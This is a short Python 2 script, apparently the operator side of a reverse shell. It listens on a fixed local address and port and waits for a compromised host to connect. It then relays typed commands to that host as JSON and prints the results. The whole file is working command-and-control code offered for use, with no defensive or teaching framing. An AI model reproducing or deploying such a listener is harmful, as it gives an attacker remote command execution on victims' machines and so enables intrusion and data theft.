
#!/usr/bin/python

import socket
from termcolor import colored
import json


def json_send(data):
	json_data = json.dumps(data)
	target.send(json_data)

def json_recv():
	data = ""
	while True:
		try:
			data = data + target.recv(1024)
			return json.loads(data)
		except ValueError:
			continue


def shell():
	while True:
		# getting command from command center, if q, quit the program, else continue...
		command = raw_input("* Shell#~%s: " %str(ip))
		#target.send(command), doesn't work for bytes greater than 1024 bytes
		# below replacement is for further support 
		json_send(command)
		
		if command == 'q':
			break
		elif command[:2] == "cd" and len(command) > 1:
			continue
		else:
			result = json_recv()
			print(result)

def server():
	global s
	global ip
	global target


	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

	s.bind(("192.168.1.96",56789))
	s.listen(5)

	print(colored("[-*-] Listening for the connection.....", 'green'))

	target, ip = s.accept()

	print(colored("[+*+] Connection established from: %s" % str(ip), 'green'))

server()
shell()
s.close()


